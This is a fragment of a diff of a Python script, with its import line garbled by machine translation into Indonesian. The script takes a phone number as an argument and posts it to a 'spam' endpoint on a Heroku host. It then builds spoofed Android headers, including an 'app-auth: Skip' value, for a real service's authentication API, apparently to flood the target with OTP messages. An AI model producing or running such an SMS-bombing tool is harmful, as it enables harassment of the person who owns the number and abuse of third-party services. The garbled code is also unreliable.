@@ -1,4 +1,4 @@
- permintaan impor , sys , waktu , json
+ permintaan  impor , sys , waktu , json
 nomor = sys.argv[1]
 req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":nomor}).text
 ua={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}
